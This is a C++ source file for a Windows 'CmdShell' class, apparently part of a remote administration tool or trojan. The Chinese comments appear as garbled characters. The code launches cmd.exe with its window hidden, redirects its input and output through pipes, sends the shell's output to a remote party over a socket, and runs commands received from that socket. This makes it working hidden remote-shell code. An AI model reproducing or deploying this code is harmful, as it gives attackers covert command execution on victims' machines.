#include "StdAfx.h"
#include "CmdShell.h"

CCmdShell::CCmdShell(void)
{
}

CCmdShell::~CCmdShell(void)
{
}

void CCmdShell::SetCmdSocket( SOCKET sock )
{
	m_socket = sock;
}

//CMD��ʼ��
void CCmdShell::Cmd_Init()
{
	//��ʼ��
	GetStartupInfo(&m_si);
	m_si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    //ʹCMD������������ܵ�����
	m_si.hStdInput = m_hReadPipe;
	m_si.hStdError = m_hWritePipe;
	m_si.hStdOutput = m_hWritePipe;
	m_si.wShowWindow = SW_HIDE;   //����
	wchar_t szCmdPath[256] = {0};
	//�õ�ϵͳĿ¼
	GetSystemDirectory(szCmdPath, sizeof(szCmdPath));   //C:\windows\system32
	wcscat_s(szCmdPath, _T("\\cmd.exe"));
	//����cmd.exe����
	BOOL bRet = CreateProcess(szCmdPath, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &m_si, &m_pi);
	if (!bRet)
	{
		printf("cmd.exe���̴���ʧ��! \n");
	}
	::CloseHandle(m_pi.hProcess);
}

void CCmdShell::Cmd_Send()
{
	DWORD dwLen = 0;    //�ܵ�ʵ�ʶ�ȡ��ֵ��С
	char szSendBuf[1024] = {0};
    
	/////////////������д����ͨ��
	SECURITY_ATTRIBUTES sa_w;
	sa_w.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa_w.lpSecurityDescriptor = NULL;
	sa_w.bInheritHandle = TRUE;
	CreatePipe(&m_hReadFile, &m_hWritePipe, &sa_w, 0);  //�������ܵ�

	SECURITY_ATTRIBUTES sa_r;
	sa_r.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa_r.lpSecurityDescriptor = NULL;
	sa_r.bInheritHandle = TRUE;
	CreatePipe(&m_hReadPipe, &m_hWriteFile, &sa_r, 0);  //����д�ܵ�

    MSGINFO_S tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
	tagMsgInfo.Msg_id = CMD_TELNET;
	while (true)
	{
		//��ȡ�ܵ��е�����
		memset(szSendBuf, 0, sizeof(szSendBuf));
		if (!ReadFile(m_hReadFile, szSendBuf, 1023, &dwLen, NULL))   //������
		{
			break;   //��ȡʧ��
		}
		//�ѹܵ��е����ݷ��͸�Զ������
		COMMOND_S tagCmdInfo;
		memset(&tagCmdInfo, 0, sizeof(COMMOND_S));
		strcpy_s(tagCmdInfo.command, sizeof(szSendBuf), szSendBuf);  //���ܵ��ж�ȡ�������ݿ������ṹ����
		tagCmdInfo.flag = 0;  //�ṹ�屣���ֶ�
		memcpy((char*)tagMsgInfo.context, (char*)&tagCmdInfo, sizeof(COMMOND_S));
		bool bSuccess = true;
		m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
	}
	printf("CMD Send Thread Over!\n");
}

void CCmdShell::Cmd_Recv( IN char* pRecvBuf )
{
	DWORD dwByteWriten = 0;
	if (0 == strcmp("exit\r\n", pRecvBuf))  //������ܵ��˳�������
	{
		::CloseHandle(m_hWritePipe);  //�رն�д�ܵ����
		::CloseHandle(m_hReadPipe);
	}
	BOOL bWrite = WriteFile(m_hWriteFile, (char*)pRecvBuf, strlen(pRecvBuf), &dwByteWriten, NULL);
	if (!bWrite)
	{
		printf("����д��ܵ�ʧ��\n");
	}
}
